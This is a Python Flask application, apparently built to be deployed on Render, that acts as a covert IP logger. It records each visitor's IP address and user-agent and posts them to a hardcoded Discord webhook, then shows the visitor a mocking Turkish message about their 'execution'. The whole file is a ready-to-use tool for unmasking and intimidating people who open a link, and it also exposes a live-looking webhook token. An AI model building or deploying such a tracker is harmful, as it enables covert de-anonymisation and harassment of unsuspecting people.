from flask import Flask, request
import requests
import os

app = Flask(__name__)

# Discord Webhook URL'ni buraya yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565829327067684985/o10w6-xbGWqXFeAe20JDhxyoUBr74JcdsswTmLNxKKj22G5vJIF2Y9LRs-LDiujHz2PQ"

@app.route('/')
def ip_logger():
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip_address = request.remote_addr

    user_agent = request.headers.get('User-Agent')

    # Discord'a gönderilecek mesaj
    discord_data = {
        "content": f"🚨 **Yeni Ziyaretçi Yakalandı (Render)!**\n> 🌐 **IP:** `{ip_address}`\n> 💻 **Cihaz:** `{user_agent}`"
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
    except Exception as e:
        print(e)

    # Şık, modern koyu tema ve ortada büyük yazı alanı içeren tasarım
    html_content = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hoş Geldiniz</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background-color: #0f172a;
                color: #f8fafc;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                text-align: center;
                background: rgba(30, 41, 59, 0.7);
                padding: 40px;
                border-radius: 16px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
                backdrop-filter: blur(10px);
                max-width: 600px;
                width: 90%;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            h1 {
                font-size: 2.5rem;
                margin-bottom: 20px;
                color: #38bdf8;
                letter-spacing: 1px;
            }
            .textbox {
                background: #1e293b;
                border: 2px solid #334155;
                color: #cbd5e1;
                padding: 20px;
                border-radius: 10px;
                font-size: 1.2rem;
                margin-top: 15px;
                outline: none;
                box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1> Sintuv0 Tarafından infazınız verilmiştir </h1>
            <div class="textbox">
                gecmis olsun bebegim
            </div>
        </div>
    </body>
    </html>
    """
    
    return html_content

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
